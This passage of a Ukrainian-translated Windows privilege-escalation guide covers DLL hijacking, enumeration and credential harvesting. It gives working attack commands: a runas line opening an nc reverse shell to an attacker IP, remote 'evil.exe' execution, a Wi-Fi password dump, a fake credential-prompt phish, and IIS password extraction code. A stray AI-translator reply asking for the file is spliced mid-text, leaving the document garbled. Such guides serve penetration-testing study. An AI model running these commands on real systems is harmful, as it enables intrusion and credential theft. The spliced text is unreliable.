- Відстежуйте відкриття у користувацькому режимі підозрілих імен пристроїв (e.g., \\ .\\amsdk*) та специфічні послідовності IOCTL, що вказують на зловживання.
- Застосовуйте список заблокованих вразливих драйверів Microsoft (HVCI/WDAC/Smart App Control) та підтримуйте власні списки дозволених/заборонених.


## PATH DLL Hijacking

Якщо у вас є **права запису всередині папки, що міститься в PATH**, ви зможете перехопити DLL, завантажену процесом, і **підвищити привілеї**.

Перевірте права доступу для всіх папок у PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Детальніше про те, як зловживати цією перевіркою:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## Мережа

### Шари
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Перевірте наявність інших відомих комп'ютерів, жорстко прописаних у hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Мережеві інтерфейси та DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Відкриті порти

Перевірте наявність **служб з обмеженим доступом** ззовні
```bash
netstat -ano #Opened ports?
```
### Таблиця маршрутизації
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP таблиця
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Правила брандмауера

[**Перегляньте цю сторінку для команд, пов'язаних з брандмауером**](../basic-cmd-for-pentesters.md#firewall) **(перегляд правил, створення правил, вимкнення, вимкнення...)**

Більше[ команд для мережевої енумерації тут](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Бінарний файл `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримаєте root, ви зможете прослуховувати будь-який порт (при першому використанні `nc.exe` для прослуховування порту він через GUI запитає, чи слід дозволити `nc` у firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Щоб легко запустити bash як root, можна спробувати `--default-user root`

Ви можете переглянути файлову систему `WSL` у папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Облікові дані Windows

### Облікові дані Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Менеджер облікових даних / Windows Vault

Джерело [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Windows Vault зберігає облікові дані користувачів для серверів, вебсайтів та інших програм, в які **Windows** може **автоматично входити за користувача**. На перший погляд це може виглядати так, ніби користувачі можуть зберігати свої облікові дані для Facebook, Twitter, Gmail тощо, щоб автоматично входити через браузери. Але це не так.

Windows Vault зберігає облікові дані, які **Windows** може використовувати для автоматичного входу користувачів, що означає: будь-який Windows-додаток, якому потрібні облікові дані для доступу до ресурсу (сервера або вебсайту), може використовувати цей Credential Manager & Windows Vault і застосовувати збережені облікові дані замість того, щоб користувачі постійно вводили ім'я користувача та пароль.

Якщо додатки не взаємодіють із Credential Manager, навряд чи вони зможуть використовувати облікові дані для конкретного ресурсу. Тому, якщо ваш додаток хоче скористатися сховищем, він повинен якимось чином спілкуватися з credential manager і запитувати облікові дані для цього ресурсу з сховища за замовчуванням.

Використовуйте `cmdkey` для виведення списку збережених облікових даних на машині.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Тоді ви можете використовувати `runas` з параметром `/savecred`, щоб скористатися збереженими обліковими даними. Наведений приклад викликає віддалений бінарний файл через SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Використання `runas` з наданим набором облікових даних.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Зверніть увагу, що mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), або модуль [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The Data Protection API (DPAPI) забезпечує метод симетричного шифрування даних, переважно використовується в операційній системі Windows для симетричного шифрування приватних ключів асиметричних алгоритмів. Це шифрування використовує секрет користувача або системи, який суттєво додає ентропії.

**DPAPI дозволяє шифрування ключів за допомогою симетричного ключа, який виводиться з облікових секретів користувача**. У випадках шифрування на рівні системи воно використовує аутентифікаційні секрети домену системи.

Зашифровані RSA-ключі користувача, за допомогою DPAPI, зберігаються в директорії `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` представляє [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, розташований разом з головним ключем, що захищає приватні ключі користувача в тому самому файлі,** зазвичай складається з 64 байтів випадкових даних. (Важливо зауважити, що доступ до цієї директорії обмежено, через що неможливо перелічити її вміст за допомогою команди `dir` в CMD, хоча її можна перелічити через PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Можна використати **mimikatz module** `dpapi::masterkey` з відповідними аргументами (`/pvk` або `/rpc`) для його розшифрування.

**credentials files protected by the master password** зазвичай розташовані в:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Ви можете використовувати **mimikatz module** `dpapi::cred` із відповідним `/masterkey` для розшифрування.\\
Ви можете витягти багато **DPAPI** **masterkeys** з **memory** за допомогою модуля `sekurlsa::dpapi` (якщо ви root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** часто використовуються для scripting та automation tasks як зручний спосіб зберігання encrypted credentials. Credentials захищені за допомогою **DPAPI**, що зазвичай означає, що їх можна розшифрувати лише тим самим користувачем на тій же машині, де вони були створені.

Щоб **розшифрувати** PS credentials з файлу, який його містить, ви можете:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Збережені RDP-підключення

Їх можна знайти в `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
та в `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Нещодавно виконані команди
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Менеджер облікових даних Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
Ви можете **витягнути багато DPAPI masterkeys** з пам'яті за допомогою Mimikatz `sekurlsa::dpapi` модуля

### Sticky Notes

Користувачі часто використовують додаток StickyNotes на робочих станціях Windows, щоб **зберігати паролі** та іншу інформацію, не усвідомлюючи, що це файл бази даних. Цей файл знаходиться за шляхом `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` і завжди варто його шукати та переглядати.

### AppCmd.exe

**Зауважте, що для відновлення паролів з AppCmd.exe потрібно бути Administrator і запускатися з High Integrity рівнем.**\
**AppCmd.exe** знаходиться в директорії `%systemroot%\system32\inetsrv\`.\ 
Якщо цей файл існує, то можливо, що деякі **credentials** були налаштовані і можуть бути **відновлені**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe` .\
Інсталятори **запускаються з привілеями SYSTEM**, багато з них уразливі до **DLL Sideloading (Інформація з** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Файли та реєстр (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH ключі в реєстрі

SSH приватні ключі можуть зберігатися в реєстровому ключі `HKCU\Software\OpenSSH\Agent\Keys`, тож слід перевірити, чи є там щось цікаве:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Якщо ви знайдете будь-який запис у цьому шляху, це, ймовірно, збережений SSH-ключ. Він зберігається в зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Більше інформації про цю техніку тут: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Якщо сервіс `ssh-agent` не запущений і ви хочете, щоб він автоматично запускався під час завантаження, виконайте:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Схоже, ця техніка більше не діє. Я пробував створити кілька ssh keys, додати їх за допомогою `ssh-add` і підключитися по ssh до машини. Гілка реєстру HKCU\Software\OpenSSH\Agent\Keys не існує, і procmon не виявив використання `dpapi.dll` під час аутентифікації асиметричного ключа.

### Файли без нагляду
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Ви також можете шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_

Приклад вмісту:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM резервні копії
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Облікові дані хмари
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Пошукайте файл під назвою **SiteList.xml**

### Кешований GPP пароль

Раніше була доступна функція, яка дозволяла розгортати користувацькі локальні облікові записи адміністратора на групі машин за допомогою Group Policy Preferences (GPP). Однак цей метод мав суттєві проблеми з безпекою. По-перше, Group Policy Objects (GPOs), що зберігаються як XML-файли в SYSVOL, могли бути доступні будь-якому доменному користувачеві. По-друге, паролі в цих GPP, зашифровані AES256 з використанням опублікованого за замовчуванням ключа, могли бути розшифровані будь-яким автентифікованим користувачем. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.

Щоб зменшити цей ризик, була розроблена функція для сканування локально кешованих файлів GPP, що містять поле "cpassword", яке не пусте. Знайшовши такий файл, функція розшифровує пароль і повертає кастомний PowerShell-об'єкт. Цей об'єкт містить відомості про GPP та розташування файлу, що допомагає у виявленні та усуненні цієї вразливості.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Щоб розшифрувати cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Використання crackmapexec для отримання паролів:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web конфігурація
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Приклад web.config з обліковими даними:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN облікові дані
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Журнали
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ask for credentials

Ви завжди можете **попросити користувача ввести його credentials або навіть credentials іншого користувача**, якщо вважаєте, що він може їх знати (зауважте, що **прохання** клієнта безпосередньо надати **credentials** є дійсно **ризикованим**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Можливі імена файлів, що містять credentials**

Відомі файли, які раніше містили **passwords** у **clear-text** або **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don’t have access to your files. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or attach the file). I will translate the English text to Ukrainian, preserving all markdown/html, tags, links, paths, and not translating code or technical names.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Облікові дані у RecycleBin

Також перевірте Bin, щоб знайти в ньому облікові дані

Щоб **відновити паролі**, збережені різними програмами, ви можете використати: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### У реєстрі

**Інші можливі ключі реєстру з обліковими даними**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Ви повинні перевірити бази даних (dbs), де зберігаються паролі від **Chrome or Firefox**.\
Також перевірте історію, закладки та улюблені браузерів — можливо, там зберігаються деякі **паролі**.

Інструменти для витягання паролів з браузерів:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** — технологія, вбудована в операційну систему Windows, яка дозволяє **взаємодію** між програмними компонентами, написаними різними мовами. Кожний COM-компонент **ідентифікується за допомогою class ID (CLSID)**, і кожний компонент надає функціональність через одну або кілька інтерфейсів, ідентифікованих за допомогою interface IDs (IIDs).

COM-класи та інтерфейси визначені в реєстрі під **HKEY\CLASSES\ROOT\CLSID** та **HKEY\CLASSES\ROOT\Interface** відповідно. Цей розділ реєстру створюється шляхом об'єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Всередині CLSID-ів цього розділу ви можете знайти дочірній розділ реєстру **InProcServer32**, який містить **значення за замовчуванням**, що вказує на **DLL**, та значення під назвою **ThreadingModel**, яке може бути **Apartment** (Однопотоковий), **Free** (Багатопотоковий), **Both** (Одно- або багатопотоковий) або **Neutral** (Нейтральний щодо потоку).

![](<../../images/image (729).png>)

По суті, якщо ви можете **перезаписати будь-який із DLL**, які будуть виконані, ви можете **підвищити привілеї**, якщо цей DLL буде виконуватися іншим користувачем.

Щоб дізнатися, як зловмисники використовують COM Hijacking як механізм персистенції, перегляньте:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Загальний пошук паролів у файлах і реєстрі**

**Пошук вмісту файлів**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Пошук файлу з певним іменем**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Шукайте в реєстрі імена ключів та паролі**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Інструменти, що шукають passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** плагін. Я створив цей плагін для **automatically execute every metasploit POST module that searches for credentials** всередині жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли, що містять passwords, згадані на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — це ще один чудовий інструмент для витягування password із системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **sessions**, **usernames** та **passwords** кількох програм, які зберігають ці дані у відкритому тексті (PuTTY, WinSCP, FileZilla, SuperPuTTY та RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Уявіть, що **процес, який виконується як SYSTEM відкриває новий процес** (`OpenProcess()`) з **full access**. Той самий процес **також створює новий процес** (`CreateProcess()`) **з низькими привілеями, але успадковуючи всі відкриті handles головного процесу**.\
Тоді, якщо ви маєте **full access до процесу з низькими привілеями**, ви можете отримати **відкритий handle привілейованого процесу, створеного** через `OpenProcess()` і **inject a shellcode**.\
[Прочитайте цей приклад для отримання додаткової інформації про **як виявити та експлуатувати цю вразливість**.](leaked-handle-exploitation.md)\
[Прочитайте це **інше повідомлення для більш повного пояснення того, як тестувати та зловживати іншими відкритими handles процесів та потоків, успадкованих з різними рівнями дозволів (не лише full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Сегменти спільної пам'яті, які називають **pipes**, дозволяють процесам обмінюватися даними та передавати інформацію.

Windows надає функціональність **Named Pipes**, що дозволяє незалежним процесам обмінюватися даними, навіть через різні мережі. Це нагадує архітектуру client/server, з ролями **named pipe server** і **named pipe client**.

Коли дані надсилає **client** через pipe, **server**, який створив pipe, має можливість **прийняти ідентичність** **client**, за умови наявності необхідних прав **SeImpersonate**. Виявлення **privileged process**, який спілкується через pipe, який ви можете імітувати, дає змогу **отримати вищі привілеї**, перейнявши ідентичність цього процесу, щойно він взаємодіє з pipe, який ви встановили. Для інструкцій щодо виконання такої атаки корисні керівництва [**тут**](named-pipe-client-impersonation.md) та [**тут**](#from-high-integrity-to-system).

Також наступний інструмент дозволяє **перехоплювати передавання через named pipe за допомогою інструменту на кшталт burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **а цей інструмент дозволяє перелічити та переглянути всі pipes для пошуку privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Різне

### File Extensions that could execute stuff in Windows

Перегляньте сторінку **https://filesec.io/**

### **Monitoring Command Lines for passwords**

Отримавши shell як користувач, можуть бути заплановані завдання або інші процеси, що виконуються і які **передають облікові дані в командному рядку**. Наведений нижче скрипт знімає command lines процесів кожні дві секунди та порівнює поточний стан з попереднім, виводячи будь-які відмінності.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Викрадення паролів із процесів

## Від користувача з низькими правами до NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Якщо у вас є доступ до графічного інтерфейсу (через console або RDP) та UAC увімкнено, в деяких версіях Microsoft Windows можливо запустити термінал або будь-який інший процес, такий як "NT\AUTHORITY SYSTEM", від імені непривілейованого користувача.

Це дозволяє одночасно підвищити привілеї та bypass UAC через одну й ту саму вразливість. Крім того, немає потреби нічого встановлювати, а бінарний файл, що використовується в процесі, підписаний і випущений Microsoft.

Деякі з уражених систем є наступними:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
